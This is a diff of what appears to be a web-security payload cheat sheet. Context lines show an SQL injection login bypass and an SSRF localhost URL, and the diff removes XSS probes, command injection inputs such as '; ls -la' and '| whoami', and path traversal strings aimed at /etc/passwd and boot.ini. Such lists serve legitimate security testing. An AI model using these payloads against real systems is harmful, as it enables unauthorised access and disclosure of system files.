@@ -122,29 +122,9 @@ SQL Injection (SQLi)
 
 admin' --
 
-Cross-Site Scripting (XSS)
 
-<script>alert(1)</script>
 
-"><img src=x onerror=alert(1)>
 
-<svg/onload=alert('XSS')>
-
-Command Injection
-
-; ls -la
-
-| whoami
-
-& echo hacked
-
-Path Traversal
-
-../../../../etc/passwd
-
-..\\..\\..\\boot.ini
-
-SSRF
 
 http://127.0.0.1:80
 
